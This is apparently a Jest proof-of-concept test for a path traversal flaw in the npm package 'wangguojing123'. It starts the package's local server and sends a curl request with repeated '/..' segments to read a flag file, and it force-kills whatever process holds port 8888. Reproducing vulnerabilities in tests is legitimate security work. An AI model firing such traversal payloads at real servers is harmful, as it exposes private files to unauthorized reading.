var execSync = require("child_process").execSync;
afterAll(() => {
  try {
    execSync("fuser -k 8888/tcp");
  } catch (e) {}
});
const path = require("path");
const { sleep } = require("sleep");
const pathToFlag = path.resolve(__dirname, "../flag.html");
function genstr() {
  return "/..".repeat(50) + pathToFlag;
}
test("Path Traversal in wangguojing123", (done) => {
  expect.assertions(1);
  const fs = require("fs");
  const { exec } = require("child_process");
  let flagData = fs.readFileSync(pathToFlag).toString();
  const a = require("child_process");
  try {
    a.execSync("fuser -k 8888/tcp", () => {});
  } catch (e) {}
  let server = "node ./node_modules/wangguojing123/index.js";
  let exe = exec(server, (error, stdout) => {});
  sleep(2);
  let attack_string = `curl -v --path-as-is "http://127.0.0.1:8888${genstr()}"`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(flagData);
    done();
  });
});
